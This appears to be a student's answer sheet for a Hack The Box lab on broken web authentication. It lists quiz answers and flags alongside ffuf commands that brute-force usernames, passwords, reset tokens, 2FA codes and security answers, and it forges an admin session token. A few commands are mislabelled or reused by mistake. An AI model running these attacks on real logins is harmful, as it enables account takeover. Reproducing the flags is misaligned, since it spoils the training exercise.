# Enumerating Users

1. Enumerate a valid user on the web application. Provide the username as the answer.

Answer: cookster

Explanation: Look at web application response. There is a text "Unknown user.". It seems that it can be used in to narrow the accessible username. 

Hydra command: ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.54.69:49960/index.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=asa" -fr "Unknown user."

# Brute-Forcing Passwords

1. What is one prominent issue with passwords?

Answer: password reuse

Explanation: in password reuse, if there is a password compromised, then it can be used on another web application. 

2. What is the password of the user 'admin'?

Answer: Ramirez120992

Explanation: Usage ffuf command here: ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.54.69:49960/index.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=asa" -fr "Unknown user."

# Brute-Forcing Password Reset Tokens

1. On what do password recovery functionalities provided by web applications typically rely to allow users to recover their accounts?

Answer: one-time reset token

Explanation: There could be provided a tojen in url, that is the epath to reset the password. The attaker can bruteforce the token. 

2. Which flag of seq pads numbers by prepending zeros to make them the same length?

Answer: -w

Explanation: By using tool command man seq.  
    -w, --equal-width
              equalize width by padding with leading zeroes


3. How many possible values are there for a 6-digit OTP?

Answer: 1,000,000

Explanation: Combinatorics. There are 6 numbers in a token. Each  number can be in range [0,9], Range contains 10 integers. So, the answer is 10^6

4. Takeover another user's account on the target system to obtain the flag.

Answer: HTB{36da098385e641d54e1b2750721d816e}

Notes: The response useful sentense: The provided token is invalid

# Brute-Forcing 2FA Codes
 
 1.  Brute-force the admin user's 2FA code on the target system to obtain the flag.

 Answer: HTB{9837b33a1ef678c380addf7ef8a517de}

 Notes: To login, there is 2FA method. The OTP have to be provided with first Knowledge-based auth creds admin:admin. 

Note for response: Invalid 2FA Code.

Explanation: ffuf -w ./tokens.txt -u http://94.237.54.42:30510/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=6789gitdhaoph1oe4hqnumhd4b" -d "otp=FUZZ" -fr "Invalid 2FA Code."


# Vulnerable Password Reset

1. Which city is the admin user from? 

Answer: Manchester

Explanation:

Command: ffuf -w ./city_wordlist.txt -u http://94.237.54.116:41958/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=2ngns9ithqsgsuf5ueojhql77k" -d "security_response=FUZZ" -fr "Incorrect response."

2.  Reset the admin user's password on the target system to obtain the flag.

Answer: HTB{d4740b1801d9880ff70de227a54309f0}

Explanation: Obtain the flag by loggin in to the website. 

# Authentication Bypass via Direct Access

1. Apply what you learned in this section to bypass authentication to obtain the flag.

Answer: HTB{913ab2d84b8db21854c696dee1f1db68}

# Authentication Bypass via Parameter Modification

1. Apply what you learned in this section to bypass authentication to obtain the flag.

Answer: HTB{63593317426484ea6d270c2159335780}

Explanation: 
1. seq 0 999  > id.txt
2. ffuf -w ./id.txt -u http://83.136.250.52:35689/admin.php?user_id=FUZZ -X GET -b "PHPSESSID=2sfdfkjp2veo3cdn8ffu6ruhrg" -fr "Could not load admin data. Please check your privileges."

# Attacking Session Tokens

1.  A session token can be brute-forced if it lacks sufficient what?

https://owasp.org/www-community/vulnerabilities/Insufficient_Entropy

2. Obtain administrative access on the target to obtain the flag.

Answer: HTB{d1f5d760d130f7dd11de93f0b393abda}

Explanation: echo -n 'user=htb-stdnt;role=admin' | xxd -p

757365723d6874622d7374646e743b726f6c653d61646d696e

# Skill Assessment

Register:

Password does not meet our password policy:

    Contains at least one digit
    Contains at least one lower-case character
    Contains at least one upper-case character
    Contains NO special characters
    Is exactly 12 characters long

ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://83.136.250.52:38028/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=Anneboleyn12" -fr "Unknown username or password."  -b "PHPSESSID=2sfdfkjp2veo3cdn8ffu6ruhrg" -o userenum.txt -of json 

Output: gladys

grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{12}' > custom_wordlist.txt

ffuf -w ./custom_wordlist.txt -u http://83.136.250.52:38028/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials."  -b "PHPSESSID=2sfdfkjp2veo3cdn8ffu6ruhrg" -o passswords.txt  -of json

Output: dWinaldasD13

